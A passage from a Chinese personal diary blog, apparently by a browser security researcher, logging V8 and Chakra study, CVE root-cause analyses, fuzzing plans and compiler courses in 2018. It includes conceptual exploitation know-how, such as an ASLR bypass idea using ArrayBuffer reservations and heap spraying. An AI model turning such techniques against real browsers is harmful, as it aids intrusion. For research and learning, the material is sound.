title="2018-5-3"></a>2018-5-3</h2><ol><li>下午在看书，然后突然接了玄武的面试，患得患失吧，之前面试都没这种感觉。</li><li>总结一下面试：<br>CTF和内核这种充数的不算，好歹面的是浏览器组。<br>主要是讲了v8的一个洞，然后oob有一个点没分析清楚，我需要透彻的再搞一下了，还是太菜。<br>感谢给我讲了这个点的sky师傅，面的时候被问到这里真心紧张了。<br>面了45分钟，口干舌燥，最后我提问的时候，问了自己读浏览器源码的方法是否合适，万分期望能过。<br>也问了我对各种缓解机制的了解，然后就是漏洞利用，我讲的每一个洞，都被问了怎么利用，这个答的太差了，真的只是说说思路了，自己搞，写exp，真的没试过……该提升这方面的技能了，不能停滞不前！</li><li>CTF暂时不玩了，在拿到offer之前。</li></ol><h2 id="2018-5-4"><a href="#2018-5-4" class="headerlink" title="2018-5-4"></a>2018-5-4</h2><ol><li>webkit技术内幕里关于v8有一些描述，有一些帮助。</li><li>理解了一下原型链是什么。</li></ol><h2 id="2018-5-5-9"><a href="#2018-5-5-9" class="headerlink" title="2018-5-5-9"></a>2018-5-5-9</h2><ol><li>有点忘了自己都做了什么？最近做的东西周期越来越长，分开来看每天都没什么好记的（都是借口……最近太兴奋和激动有点摸鱼）</li><li>玄武实验室的offer拿到了~我最初想要的都有了，以后只需要往着安全研究员和优秀黑客的方向继续努力就行。</li><li>最近有在翻v8的一些日语资料，翻完了会放出来吧，一边看资料一边查资料读slide打基础，还有鲸书准备读。</li></ol><h2 id="2018-5-10"><a href="#2018-5-10" class="headerlink" title="2018-5-10"></a>2018-5-10</h2><ol><li>继续翻v8 exploit的资料，大概翻完了1/3，看到了GC机制那里。</li><li>下午上机组实验太伤脑子了……茶，然后最近准备再调一个v8的oob写wp了，不过还得等等…一样一样来。</li><li>c++有点不熟了呀，还是要再搞搞……</li></ol><h2 id="2018-5-11"><a href="#2018-5-11" class="headerlink" title="2018-5-11"></a>2018-5-11</h2><ol><li>继续翻v8资料，理解引擎很重要，在此基础上调洞比起靠感觉还是要好点的，纯靠感觉容易偏。</li><li>翻完了gc，好像稍微懂一点了。</li><li>今天其实发生了很多事情吧，不过不方便写在日记里，就这样吧。</li></ol><h2 id="2018-5-12"><a href="#2018-5-12" class="headerlink" title="2018-5-12"></a>2018-5-12</h2><ol><li>继续翻v8，总算翻到了对象存储（其实这部分该最先讲吧……）</li><li>准备信息系统开发的答辩什么的，下周开始要准备复习功课了。</li></ol><h2 id="2018-5-13-14"><a href="#2018-5-13-14" class="headerlink" title="2018-5-13-14"></a>2018-5-13-14</h2><ol><li>今天把v8的ppt的引擎基础部分翻完了，入职的事情也都搞的差不多了，剩下就是在去之前好好努力了。</li><li>感觉路由器这种硬件可以玩玩……相对好挖洞呢。。</li></ol><h2 id="2018-5-15-6-9"><a href="#2018-5-15-6-9" class="headerlink" title="2018-5-15-6-9"></a>2018-5-15-6-9</h2><p>这段时间沉迷期末考试无法自拔？？？嘤嘤嘤<br>有个小插曲，因为弄错了考试时间导致挂科，吃一堑长一智。。回去我就把那个误导我的垃圾学校app日了。。<br>好了，开始记笔记了。</p><h2 id="2018-6-10-11"><a href="#2018-6-10-11" class="headerlink" title="2018-6-10-11"></a>2018-6-10-11</h2><p>把v8 exploit的PPT翻译收了个尾，重新整理了下v8的学习思路。<br>从漏洞函数回溯调用路径，断点调试等，还有exp的常用思路。</p><h2 id="2018-6-12-14"><a href="#2018-6-12-14" class="headerlink" title="2018-6-12-14"></a>2018-6-12-14</h2><p>最近脚上起了个小疮去了两趟医院，走路还好疼，真的是非常不顺利了。</p><h2 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018-6-15"></a>2018-6-15</h2><p>在mac上编译了v8，之前是在win上编译的，不得不说……有个坑点就是在16.04上面，不checkout到旧的分支，是无法编译成功的，耽误了一天。<br>然后认真的研究了一下fast Properties和hidden class，拿gdb打debugprint看了很多东西学习，记笔记记笔记。</p><h2 id="2018-6-16"><a href="#2018-6-16" class="headerlink" title="2018-6-16"></a>2018-6-16</h2><p>翻译了Source to Binary Jounrney of V8 javascript engine<br>categories，get了新知识，v8的体系结构还要多调试理解。<br>另外，再需要啃一本鲸书，理解一下编译优化技术。</p><h2 id="2018-6-17"><a href="#2018-6-17" class="headerlink" title="2018-6-17"></a>2018-6-17</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-180229.png" alt="">积累着读了一点PPT<br>突然发现也已经看了和写了，还调试了不少东西了，慢慢的对v8从生疏到开始渐渐熟悉，不过到挖掘漏洞的方法论可能还要再过一段时间吧。<br>毕竟v8代码我都没咋读过，翻翻pipeline.cc了解下Turbofan的一些API</p><h2 id="2018-6-18"><a href="#2018-6-18" class="headerlink" title="2018-6-18"></a>2018-6-18</h2><p>学习了阅读v8的bytecode，和了解bytecode的生成和解释执行还有to graph的过程</p><h2 id="2018-6-19"><a href="#2018-6-19" class="headerlink" title="2018-6-19"></a>2018-6-19</h2><p>今天开始要复习一点算法呢。<br>学习了v8增加的gdb命令使用,读了<br><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">https://github.com/danbev/learning-v8/blob/master/README.md</a><br>真的难懂，看了一下午，没什么头绪。。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-19-115842.jpg" alt=""><br>关于代码生成，Builtins和Runtime还是云里雾里，头疼。<br>写了个小工具来转换unsigned long long和double<br>v8的对象存储又看了一遍。。。结果今天还是没复习算法。。睡觉睡觉。</p><h2 id="2018-6-20-21"><a href="#2018-6-20-21" class="headerlink" title="2018-6-20-21"></a>2018-6-20-21</h2><p>搬家，寄了一些东西回家，整理了整理书，虽然我看的都是电子书，但是还是存了这么多呀。<br>三年不长，但也不短。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-21-173058.jpg" alt=""><br>晚上收拾了我最后一点东西，把入职需要的材料办完，要走了呢。</p><h2 id="2018-6-22-23"><a href="#2018-6-22-23" class="headerlink" title="2018-6-22-23"></a>2018-6-22-23</h2><p>复习了几道动态规划的算法题，要考试啦。<br>另外最好的消息是迟到了。。只做了十分钟的计算机组成原理居然及格了。。感谢老师，师生情太深了，感动感动。<br>这段时间发生了不少事情，然后让我又想明白了一些事情，这段时间确实，没怎么学的进去，学的并不好。<br>今天看了蛮久的漏洞，不知道其他人是什么样，但是在我最烦最难受的时候，安全研究是最能让我平静下来的一件事情。<br>我喜欢这样，虽然目前很多地方做的并不好，但是可以慢慢学习~<br>写了个case CVE-2016-1646，还有另外一个JIT的洞，有点难懂。</p><h2 id="2018-6-24-25"><a href="#2018-6-24-25" class="headerlink" title="2018-6-24-25"></a>2018-6-24-25</h2><p>调v8一个麻烦就是编译，得想个办法.<br><a href="http://eternalsakura13.com/2018/06/26/v8_environment/">http://eternalsakura13.com/2018/06/26/v8_environment/</a><br>总算是搞定了，最近一些技术文章读的少了，思路不够开阔，学习学习……<br>还有算法考试要到了。。趴桌，继续在看动态规划和贪婪</p><h2 id="2018-6-26"><a href="#2018-6-26" class="headerlink" title="2018-6-26"></a>2018-6-26</h2><p>学习了CVE-2016-5198，原理就是在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。</p><p>都还需要总结（</p><h2 id="2018-6-27-28"><a href="#2018-6-27-28" class="headerlink" title="2018-6-27-28"></a>2018-6-27-28</h2><ol><li>看了一些内核的资料，整理整理，顺便给人鸡汤了一下。。</li><li>刷算法，准备期末。。凉了啊。。</li></ol><h2 id="2018-6-29"><a href="#2018-6-29" class="headerlink" title="2018-6-29"></a>2018-6-29</h2><ol><li>累的要死的一天,飞机晚点了三个小时，卒……</li><li>看了一些资料，学会了如何成为一个合格的安全研究员（打了鸡血</li><li>在mathias这里住下了~New story要开始了</li></ol><h2 id="2018-6-30-7-2"><a href="#2018-6-30-7-2" class="headerlink" title="2018-6-30-7-2"></a>2018-6-30-7-2</h2><ol><li>这两天在忙着入职，装电脑和认识同事。</li><li>和导师说了自己最近在做什么，从tools和Bug study的角度，然后他让我继续搞v8，得偿所愿，不过估计要干活要明天了，说是要分析的洞还没给我。</li><li>[ Browser ]  Microsoft Edge Chakra 引擎 UAF 漏洞分析 (CVE-2018-0946)：<a href="https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/an-analysis-of-the-use-after-free-bug-in-microsoft-edge-chakra-engine.html</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1534&amp;desc=3</a></li><li>[ Browser ] CVE-2018-5146<br><a href="http://blogs.360.cn/blog/how-to-kill-a-firefox/" target="_blank" rel="noopener">http://blogs.360.cn/blog/how-to-kill-a-firefox/</a><br>A神之前就说在写一个没有poc的exp，不知道是不是这个洞，突然想到。<br>others（同事写的root cause和exploit，还有怎么用shadow来分析堆，很有意义。</li><li>看了鲸书1-4章，不少熟悉的名词……interesting</li></ol><h2 id="2018-7-3"><a href="#2018-7-3" class="headerlink" title="2018-7-3"></a>2018-7-3</h2><p>刚入职这段时间确实是最宽松的一段时间了，只需要学习就行了，没有什么其他KPI，后面应该就多了。<br>今天分析CVE-2017-0234，不过主要花时间都花在环境搭建上，漏洞触发和分析并不难，或者说还好。</p><h2 id="2018-7-4"><a href="#2018-7-4" class="headerlink" title="2018-7-4"></a>2018-7-4</h2><ol><li>今天把CVE-2017-0234的分析报告初版写完了，掌握了vs和windbg的两种很棒的调试方法，然后在编译v8，算是学到了一点东西，得再加强code review的能力。</li><li>成功在win上编译好了v8，可以玩一下。</li></ol><h2 id="2018-7-5"><a href="#2018-7-5" class="headerlink" title="2018-7-5"></a>2018-7-5</h2><ol><li>0234还要分析第二版，不过还不急，今天在自己分析其他v8的漏洞，一个p2o的洞的利用，思路真是棒，学到了学到了~<br><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a></li></ol><h2 id="2018-7-6"><a href="#2018-7-6" class="headerlink" title="2018-7-6"></a>2018-7-6</h2><ol><li>上班摸鱼好几天，今天下午听了各个大佬每周做的事情和科总的分享，觉得要走的路还很长。</li><li>目前的计划：<br>先看一些代码和语言标准；<br>talk和blog（可以看看如何移植v8，并思考其中可能出现的漏洞<br>Firefox的<a href="https://github.com/MozillaSecurity/funfuzz/tree/master/src/funfuzz/js/jsfunfuzz" target="_blank" rel="noopener">fuzz</a>（编译原理不止要领会意义，更要能写出来。<br>另外是关于win下用到了v8的各种软件的调试，也是一个学习面（比如可以看看漏洞战争等资料学习windbg和常规利用）</li></ol><p><strong>你要用较少的时间走完别人走了很久的路，所以你要跑起来，要飞快地跑起来。</strong></p><ol><li>和导师聊过自己分析的第一版漏洞，发现很多问题，我需要更深入的思考。其实安全研究有点像一个侦探游戏，每一行都是线索，我漏掉一点东西就拼不出完整的拼图。（因缺思厅<br>PoC能否修改？怎么修改？思考如下：</li></ol><ul><li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li><li>是否一定用到循环？去掉循环行不行？怎么精简PoC?<br>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）<br>（去掉边界的代码是三行，代表一个JIT生成的可选项，为什么要这么选？）</li></ul><h2 id="2018-7-7"><a href="#2018-7-7" class="headerlink" title="2018-7-7"></a>2018-7-7</h2><ol><li>今天上午去办了个房卡，一个月4000，押二付一，资产清零2333，其实居住条件就一般啦，只是离公司近，方便加班（摸鱼）</li><li>今天和朋友聚了个餐，以后就全吃公司救济粮了~</li><li>继续看0234，直接挂win API没调到点子上，但是最后还是换了个想法搜到了。。还行。。方向没错。</li><li>思考和调试新的攻击方法，趴桌。</li></ol><h2 id="2018-7-8"><a href="#2018-7-8" class="headerlink" title="2018-7-8"></a>2018-7-8</h2><ol><li>把0234第二版写好了（调试分析昨天已经结束了，今天只是整理文案……）</li><li>然后看c++对象模型，很有意思。</li><li>研究了一下js fuzzer</li><li>继续思考和调试某个洞（或者说软件）的新的攻击方法。</li></ol><h2 id="2018-7-9"><a href="#2018-7-9" class="headerlink" title="2018-7-9"></a>2018-7-9</h2><ol><li>下午就是在部署fuzz和抄代码,然后xx发了个webkit的洞，我看看……还有公司推送了一个dlmalloc的。。都看看</li><li>导师说我写的FUZZ是浪费时间2333，嗯，是这样的，我不用太心急，这就是有人带的好处……很多点能够及时纠正（然后一下午没了2333<br>沿着各个组件，各个组件都出过什么漏洞这个线索去分析好了，人的力量才是无穷大的。<br>嗯，先把思路和相关知识建立起来。</li></ol><h2 id="2018-7-10-11"><a href="#2018-7-10-11" class="headerlink" title="2018-7-10-11"></a>2018-7-10-11</h2><ol><li>在这找test看，<a href="https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/test/mjsunit/es6/regress/</a></li><li>v8相关的索引，<a href="https://v8.paulfryzel.com/docs/master/index.html" target="_blank" rel="noopener">https://v8.paulfryzel.com/docs/master/index.html</a></li><li>看每天的commit，<a href="https://github.com/v8/v8/commits/master" target="_blank" rel="noopener">https://github.com/v8/v8/commits/master</a></li><li>看gpz的漏洞，每天写一篇分析（当然不可能放出来（逃<br><a href="https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725" target="_blank" rel="noopener">https://www.exploit-db.com/author/?order_by=date_published&amp;order=desc&amp;pg=1&amp;a=7725</a></li><li>最近在思考一些个人研究是否要放博客上，仔细想了想还是算了，漏洞理解的思路，比很多东西要宝贵吧。</li></ol><h2 id="2018-7-12"><a href="#2018-7-12" class="headerlink" title="2018-7-12"></a>2018-7-12</h2><ol><li>现在想要挖到洞，想学会漏洞利用，顺便，月乃安利了一个repo,PPP的<a href="https://github.com/theori-io/pwnjs" target="_blank" rel="noopener">https://github.com/theori-io/pwnjs</a></li><li>这两天可能因为一些原因心情异常烦躁，一方面是弱的不行的自己，一方面是想要的更多，哇，真想哭……好了，杂事就不管了，我又不是神，怎么可能面面俱到。</li><li>闭关，博客会更新日记，在有一定系统化的总结思路之前，博客不会再更新文章了（日更变月更？）</li></ol><h2 id="2018-7-13"><a href="#2018-7-13" class="headerlink" title="2018-7-13"></a>2018-7-13</h2><p>今天开了个组会，可以说是非常开心了……<br>每天东看瞎看，没看点有用的东西……（发呆</p><p>然后导师给了我下一版要继续分析清楚的点。</p><ol><li>VritualAlloc分配的和GC管理的区别，GC机制</li><li>开发者为什么这么设计这个？为什么之前不限制4GB<br>（明明超过4GB就会OOB，为什么还去掉上界，他们就真的是觉得4GB足够大？其实不是；patch补的其实是没问题的，虽然依然可以dos，但是这个不是大问题，应该还是要从GC的角度去再思考一下，或者其他？）</li><li>这个内存管理是实现有问题还是设计有问题？实现有问题那么还有哪些地方是这么实现的，设计同理。要比开发者更了解他们所写的软件（：<br>安全研究的本质还是回归到对开发者的代码的深层次理解，一层一层的往下深挖，才能挖到线索，挖到真相（</li></ol><p>太菜了太菜了……受不了我自己了……<br>今天的收获是和刘炜师傅指点了我好多，一些源码里的疑问搞的清楚了，还解决了其他问题，nice……每天学的都比较痛并快乐着了。</p><h2 id="2018-7-14"><a href="#2018-7-14" class="headerlink" title="2018-7-14"></a>2018-7-14</h2><p>一觉睡到下午一点半……23333，还好周末，不过平常起得也不早，还好在玄武，要不然要被开了……<br>然后晚上和川神还有夜影他们约了个饭，感觉还不错~(然后吃完了滚回来加班)<br>今天看了点chakra，分析了cve-2016-7189，用英文写了wp，明天再整理一下pattern（root cause比较好写，只是关于callback我调了一下，挺好玩的）<br>type confused还是很普遍的漏洞，但是其实还是不大好覆盖到每个点去看，有没有什么好思路呢（发呆</p><h2 id="2018-7-15-18"><a href="#2018-7-15-18" class="headerlink" title="2018-7-15-18"></a>2018-7-15-18</h2><p>这几天真的有点懵……或者说有点迷茫，开始搞chakra，代码还是那么难啃，不过比v8好搞多了……<br>关于开发者的假设最后还是弄清楚了，其实就还好，是我分析的时间间隔有点长，没直接串起来，一个宽度问题。<br>在想明白之前觉得自己要被开了，现在还好。<br>今天游走了一天，把zdi的博客上的一些分析看了，有点意思，但是还不够。<br>另外我又要继续分析了。<br>为什么VirtualAlloc比GC更不安全，GC机制。<br>导师让我找几个渲染引擎的老的UAF洞看看~（估计就16年的吧<br>感觉又要踩坑……<br>搭了一个VPN服务器，这样就不用担心v8拉取不下来了……<br><a href="https://cloud.tencent.com/developer/article/1154896" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1154896</a><br>人生苦短我用docker</p><h2 id="2018-7-19-24"><a href="#2018-7-19-24" class="headerlink" title="2018-7-19-24"></a>2018-7-19-24</h2><ol><li>看了看雪峰会，sky师傅讲浏览器的议题很有意思。</li><li>看洞，整理一些loki的洞看。</li><li>准备开始JIT之旅<br>TODO List</li></ol><p>中科大的编译原理课程，比较简单<br><a href="http://mooc.study.163.com/course/1000002001?tid=1000003000#/info" target="_blank" rel="noopener">http://mooc.study.163.com/course/1000002001?tid=1000003000#/info</a><br><a href="http://staff.ustc.edu.cn/~bjhua/courses/compiler/2014/" target="_blank" rel="noopener">http://staff.ustc.edu.cn/~bjhua/courses/compiler/2014/</a></p><p>斯坦福的CS143，编译基础<br><a href="https://lagunita.stanford.edu/courses/Engineering/Compilers/Fall2014/about" target="_blank" rel="noopener">https://lagunita.stanford.edu/courses/Engineering/Compilers/Fall2014/about</a><br>斯坦福的CS243，编译优化<br><a href="http://infolab.stanford.edu/~ullman/dragon/w06/w06.html" target="_blank" rel="noopener">http://infolab.stanford.edu/~ullman/dragon/w06/w06.html</a></p><p>CMU，编译基础<br><a href="http://www.cs.cmu.edu/~rjsimmon/15411-f15/" target="_blank" rel="noopener">http://www.cs.cmu.edu/~rjsimmon/15411-f15/</a><br>CMU，编译优化<br><a href="http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15745-s16/www/" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15745-s16/www/</a></p><ol><li>pizlo的PPT很nice<br><a href="http://www.filpizlo.com/slides/pizlo-dls2017-vmil2017-jscvm-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-dls2017-vmil2017-jscvm-slides.pdf</a></li><li>开始0236……</li></ol><h2 id="2018-7-25-26"><a href="#2018-7-25-26" class="headerlink" title="2018-7-25-26"></a>2018-7-25-26</h2><p>分析漏洞更深入了，思考的过程和思路慢慢搭起来了。<br>今天开始看编译原理。记录一些有趣的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">perfect hashing</span><br><span class="line">1. 什么是（关键字的）完美哈希？</span><br><span class="line">没有关键字冲突的哈希函数</span><br><span class="line">2. 如何构造完美哈希？试列举一到两种算法。</span><br><span class="line">目前用的比较多的是gperf算法</span><br><span class="line">为什么需要构造完美哈希？用关键字单链表是否f可以？</span><br><span class="line">因为完美哈希一次匹配，的时间效率为O(1),而链表要扫描一遍，时间效率为O(N)</span><br></pre></td></tr></table></figure></p><p>正则表达式代码生成工具<br><a href="http://www.txt2re.com/" target="_blank" rel="noopener">http://www.txt2re.com/</a><br>NFA-&gt;DFA,有限状态自动机</p><p>递归下降分析算法<br>LL(1),ANTIR</p><h2 id="2018-7-27"><a href="#2018-7-27" class="headerlink" title="2018-7-27"></a>2018-7-27</h2><p>总结一下今天，组会上分享的刚好是浏览器相关的东西，学到很多，此外最重要的是听了别人每周在干什么，也慢慢的知道了自己以后研究该看什么。<br>*日常被导师吐槽东看瞎看，看的深度不够没有意义2333<br>此外就是在看编译原理了，JIT始终是一个大的攻击面，而且写js/dom fuzz也绕不开编译原理，要吃掉这块始终不容易。。我还是太菜了。</p><h2 id="2018-7-28-29"><a href="#2018-7-28-29" class="headerlink" title="2018-7-28-29"></a>2018-7-28-29</h2><ol><li>这两天看了realworld ctf,和继续学习编译原理,看的还算快。。</li><li>spectre的漏洞利用和同事聊了一下，还是没做出来这个题，等官方wp学习一下，说来长亭这个比赛很有意思了……<br>说来vm escape已经变成常规题了……23333，可以学习一个了…<br>代码量还是不够啊，等这段时间搞完，就大量抄和读了……（没什么自己的需求，就不自己写了）<br>积累积累积累</li></ol><h2 id="2018-7-30"><a href="#2018-7-30" class="headerlink" title="2018-7-30"></a>2018-7-30</h2><p>终于看得懂《IFuzzer: An Evolutionary Interpreter Fuzzer<br>Using Genetic Programming》说的什么了。<br>不过确实有局限性，充其量是个demo，想自己写一个了。<br>commit要看，标准要读，漏洞要调，代码要写。<br>小孩子才做选择，我全都要。</p><h2 id="2018-7-31-8-2"><a href="#2018-7-31-8-2" class="headerlink" title="2018-7-31-8-2"></a>2018-7-31-8-2</h2><p>ctf pwn中的v8漏洞利用的坑差不多结了。。思路很多但是终究还是那些东西，利用都是好搞的，回归挖洞（笔记不放）</p><p>学会用antlr4（词法/语法分析）写点东西开了个头。。不过预计搞起来也很快<br>（IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming）<br>主要是参考这篇paper学习一下，有很多想法了。</p><p>然后剩下的主要工作就是学习编译优化，审计一下v8的JIT（看刘炜师傅写的两篇wp很有启发，看得出他对v8 IR有很多理解了，我也可以就这一块多做一些总结输出。。。</p><p>和朋友聊了一下，有的东西没有想象中的难，赶紧做出点东西，然后往前走吧。</p><h2 id="2018-8-3"><a href="#2018-8-3" class="headerlink" title="2018-8-3"></a>2018-8-3</h2><ol><li>日子一天天的过……今天发工资了蛮开心2333</li><li>今天分享的东西蛮有意思，听大家说这周做了什么，关于Fuzz的讨论也有意思，貌似有点上路了，这些基础的积累都是有意义的。</li><li>这周清理了一些坑，然后挖了更多坑，结了antlr4之后准备开始污点分析之旅了。<br>顺手列一下煜博推荐的paper：<br>All You Ever Wanted to Know About<br>Dynamic Taint Analysis and Forward Symbolic Execution (but might have been afraid to ask)<br>VUzzer: Application-aware Evolutionary Fuzzing<br>Towards Efficient Heap Overflow Discovery</li><li>发现一个好玩的网站的样子：<a href="http://www.vxjump.net/" target="_blank" rel="noopener">http://www.vxjump.net/</a></li><li>最后再贴一个编译优化的，还是CMU的，不过年份不同。<br><a href="http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs/academic/class/15745-s06/web/schedule.html</a></li><li>本来最后了，不过还有新的最后，……<br>sky师傅和我讲下一步干嘛了。</li></ol><p>最后和我说了一下，其实ArrayBuffer的这种分配方式，可以完美bypass 64位ASLR<br>其实这里又涉及一个点，那就ASLR的必要条件是虚拟地址空间足够大，而我们的物理地址空间很小，不可能堆喷喷满。<br>但是……我们可以用0x10000的内存去占位4G，那么其实只要喷2G就可以了……这就bypass了，2333</p><p>这些小特性，大特性，系统特性，各种特性的深入理解和消化绝对是十分重要的。<br>我体验了一次如何从0234发现0236的过程，收获颇丰。</p><h2 id="2018-8-4-9"><a href="#2018-8-4-9" class="headerlink" title="2018-8-4-9"></a>2018-8-4-9</h2><ol><li>结束了antlr4的学习，fuzz进程挂起。</li><li>开始看v8源码，真多……真难懂2333……我好菜。</li><li>听同事说，有人看了两个月编译优化被开了。。好方。。加班看书看到2点。。<br>找到一个不错的PPT。<a href="http://sei.pku.edu.cn/~xiongyf04/SA/2015/" target="_blank" rel="noopener">http://sei.pku.edu.cn/~xiongyf04/SA/2015/</a></li><li>今天和sky师傅聊了一下，收获很多，思路很重要，不仅是挖洞的思路，调洞的思路，学习的思路，分析的思路，都很重要。</li><li>今天花时间整理了一下gpz的洞和bugs上能找到的JIT的洞，还是挺凌乱的，也开始思考一些JIT的攻击面的本质，结点的处理等等，把文件都翻了一下。</li></ol><h2 id="2018-8-9-18"><a href="#2018-8-9-18" class="headerlink" title="2018-8-9-18"></a>2018-8-9-18</h2><ol><li>好像很久没写日记了。。不知道为什么。。可能是突然泄气，人的情绪总是飘忽不定，对我们这种人更是如此。</li><li>还是写一下这段时间做了什么，还是JIT、JIT、JIT，说来我是从什么时候开始想要挖浏览器漏洞呢？为什么选择这么一条路呢？回忆一下又觉得当年浪费了太多时间在无意义的事情上（比如CTF，Android），应该好好看webkit的……叹气<br>不过说来这几天看到的JIT的资料还不错，大宝写了JIT漏洞的分析。<br><a href="http://www.filpizlo.com/slides/pizlo-icooolps2018-inline-caches-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-icooolps2018-inline-caches-slides.pdf</a><br><a href="https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf" target="_blank" rel="noopener">https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf</a><br><a href="https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/" target="_blank" rel="noopener">https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/</a><br>从目前js引擎的攻击面来看，wasm和JIT可能是最可能出洞的点了。。也不好搞也不好搞2333<br><a href="https://googleprojectzero.blogspot.com/2018/08/the-problems-and-promise-of-webassembly.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2018/08/the-problems-and-promise-of-webassembly.html</a></li><li>周六睡到中午，然后去了长亭的“无pwn不欢”线下沙龙，领了衣服和杯子，感动。<br>冠成大佬的分享很nice，似乎一下子点出了我觉得逆向越来越迷的关键……<br><a href="https://github.com/A7um/slides/blob/master/2018/re_methodology.pdf" target="_blank" rel="noopener">https://github.com/A7um/slides/blob/master/2018/re_methodology.pdf</a><br>链接:<a href="https://pan.baidu.com/s/1K6Wdj1L6Dt5LJb7R-7GLhA" target="_blank" rel="noopener">https://pan.baidu.com/s/1K6Wdj1L6Dt5LJb7R-7GLhA</a>  密码:jgks</li><li>之前冠成大佬经常逆国产小软件挖洞，然后我一直不知道是咋搞的。。<br><strong>现在想想，或许能够熟练的掌握trace+disassembly/指令记录+分析，这样的一种逆向能力，是十分重要的（如果是国产小软件，再加上如何从二进制文件搜索开源代码吧）</strong><br><strong>至于说，和做CTF一样，逆向各种神奇的架构和算法，我觉得是没必要的。</strong><br>嘛，虽然我还都不会，不过姑且给自己找到了一个学习的思路和方法，还是收获蛮多。</li><li>这段时间的主要工作是在分析CVE-2017-5121，关于v8 escape analysis phase，不过没有patch，这个漏洞是发生在6.1版本之前，6.2之后换掉了整个escape analysis，重新实现了一遍。<br>这个漏洞实际上是逃逸分析将一个对象分析为不会逃逸后，将其初始化节点删除，而又有LoadElement/LoadField的节点使用它。本质上是由于有依赖关系的节点的访问顺序不正确导致的。</li></ol><h2 id="2018-8-19"><a href="#2018-8-19" class="headerlink" title="2018-8-19"></a>2018-8-19</h2><ol><li>真的是硬生生赖床到一点半，饿的要死了才爬起来上班……</li><li>试图去搜和v8有关的design paper读，但是没找到，ORZ。。浪费时间。。</li><li>分析load elimination phase，学到不少东西。</li></ol><h2 id="2018-8-20"><a href="#2018-8-20" class="headerlink" title="2018-8-20"></a>2018-8-20</h2><p>我觉得挖edge怕不是loki的KPI吧。。又是挖了一堆，其中有一个还和大宝的撞了，是不是大佬的思路都是一样的……ORZ<br>今天可以分析学习一个。<br>今天各种填学校回去要交的材料，然后申请盖章，ORZ。<br>各种麻烦死。</p><ul><li>[Edge]  [CVE-2018-8298] [1582]   1582 - Microsoft Edge: Chakra: Bugs in InitializeNumberFormat and InitializeDateTimeFormat - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1582" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1582</a></li><li>[Edge]  [None] [1578]   1578 - Microsoft Edge: Chakra: JIT: Type confusion with InlineArrayPush - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1578" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1578</a></li><li>[Edge]  [CVE-2018-8291] [1576]   1576 - Microsoft Edge: Chakra: DictionaryPropertyDescriptor::CopyFrom doesn’t copy all fields - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1576" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1576</a></li><li>[Edge]  [CVE-2018-8279] [1570]   1570 - Microsoft Edge: Chakra: Parameter scope parsing bug - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1570" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1570</a></li><li>[Edge]  [CVE-2018-8288] [1565]   1565 - Microsoft Edge: Chakra: JIT: ImplicitCallFlags check bypass with Intl - project-zero - Monorail<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1565" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1565</a></li></ul><h2 id="2018-8-21"><a href="#2018-8-21" class="headerlink" title="2018-8-21"></a>2018-8-21</h2><ol><li>昨天看的一点点东西更新了一篇笔记，就当理理思路了。</li><li>昨天要的证明总算开下来了，心里松了一口气，下面调整一下自己的作息，好好工作了。</li><li>R大讲了一些turboFan IR设计的东西，给了一些paper读，非常nice<br><a href="https://www.zhihu.com/question/290982869/answer/474629999" target="_blank" 